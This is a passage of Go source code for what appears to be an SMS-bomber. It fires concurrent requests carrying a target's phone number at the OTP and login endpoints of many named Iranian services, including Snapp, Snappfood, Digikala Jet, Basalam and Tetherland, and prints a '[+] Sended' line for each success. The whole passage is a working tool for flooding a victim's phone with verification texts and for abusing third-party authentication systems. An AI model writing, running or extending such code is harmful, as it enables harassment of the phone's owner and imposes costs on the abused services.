				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // anargift.com (JSON) - send_code
		tasks <- func() {
			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digitalsignup.snapp.ir (URL query)
		tasks <- func() {
			sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digitalsignup.snapp.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // Snappfood (Form)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("cellphone", phone)
			sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
		}
		wg.Add(1) // khodro45.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
				"mobile": phone,
				"device_type": 2,
			}, &wg, ch)
		}
		wg.Add(1) // irantic.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // basalam.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // drnext.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digikalajet.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // caropex.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // tetherland.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // tandori.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
